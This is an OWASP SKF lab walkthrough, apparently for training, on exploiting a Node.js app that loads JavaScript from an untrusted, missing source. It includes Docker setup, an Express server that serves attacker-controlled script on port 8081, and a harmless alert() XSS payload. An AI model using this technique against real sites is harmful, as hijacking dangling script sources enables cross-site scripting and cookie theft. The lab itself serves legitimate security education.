# Include Files From Untrusted Sources (JS)

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:untrusted-sources-js
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:untrusted-sources-js
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

#### Step1

When including third-party functionality, such as a web widget, library, or other source of functionality, the software must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.

This might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware

First, let's check the application to see if there are any sources being loaded in the app that return a 404.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Untrusted-sources/1.png)

When inspecting the network tab we see that the application fails to load a JS file to the URL

```
https://localhost:8081/script-provider/javascript.js
```

_note: in a penetration test we would now see if the domain that is used to grab the js source file from is free for us to register_

## Exploitation

#### Step1

Now, in order to leverage a successfull XSS attack we need to set up our own local server on port 8081
that serves the our malicious javascript. You could achieve this in many diferent ways, let's use nodeJs this time:

```javascript
const express = require("express");
const app = express();

app.use(express.static(__dirname));
app.use(express.urlencoded({ extended: true }));

app.get("/:path", (req, res) => {
  res.sendFile("/script_provider/" + req.params.path);
});

const port = process.env.PORT || 8081;

app.listen(port, () => console.log(`Listening on port ${port}...!!!`));
```

#### Step2

We ofcourse also need to set the right path where to serve the file from:

```text
./script_provider/javascript.js
```

#### Step3

The content of the JS file that we use to deliver the malicious XSS from looks no more basic than
this:

```text
alert("evil payload");
```

#### Step4

Now it is time to start our web server.

```text
npm install express
node script_provider.js
```

#### Step5

We visit the target application where we now find our 'alert' that we coded in our javascript.js file

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Untrusted-sources/2.png)

## Additional sources

{% embed url="https://book.hacktricks.xyz/pentesting-web/xssi-cross-site-script-inclusion" %}
